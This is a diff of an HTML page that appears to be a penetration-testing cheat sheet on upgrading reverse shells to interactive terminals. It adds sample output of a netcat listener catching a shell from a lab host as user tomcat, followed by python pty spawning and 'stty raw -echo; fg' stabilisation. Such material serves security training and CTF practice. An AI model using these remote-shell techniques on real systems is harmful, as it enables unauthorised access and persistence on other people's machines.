@@ -340,10 +340,19 @@ body.dark-mode #dynamicFormContainer button:hover {
 <button data-tabset="set1" data-tabcontent="tab3" >script</button>
 
 <div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">python3 -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> rlwrap nc -lvnp <span class="m">1337</span> 
+</span></span><span class="line"><span class="cl"><span class="go">listening on [any] 1337 ...
+</span></span></span><span class="line"><span class="cl"><span class="go">connect to [10.10.14.31] from (UNKNOWN) [10.10.10.55] 33490
+</span></span></span><span class="line"><span class="cl"><span class="go">id
+</span></span></span><span class="line"><span class="cl"><span class="go">uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
+</span></span></span><span class="line"><span class="cl"><span class="go">python3 -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;
+</span></span></span><span class="line"><span class="cl"><span class="go">tomcat@kotarak-dmz:/$ 
+</span></span></span><span class="line"><span class="cl"><span class="go">zsh: suspended  rlwrap nc -lvnp 1337
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Ctrl-Z to send the process to background, <span class="k">then</span>
 </span></span><span class="line"><span class="cl"><span class="go">stty raw -echo; fg
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> After fg, press enter again, <span class="k">then</span>
-</span></span><span class="line"><span class="cl"><span class="go">export TERM=xterm-256color
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
+</span></span><span class="line"><span class="cl"><span class="go">[1]  + continued  rlwrap nc -lvnp 1337
+</span></span></span><span class="line"><span class="cl"><span class="go">tomcat@kotarak-dmz:/$ 
 </span></span></span></code></pre></div></div>
 
 <div class="tabcontent" data-tabset="set1" data-tabcontent="tab2"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Start a <span class="nb">local</span> http server
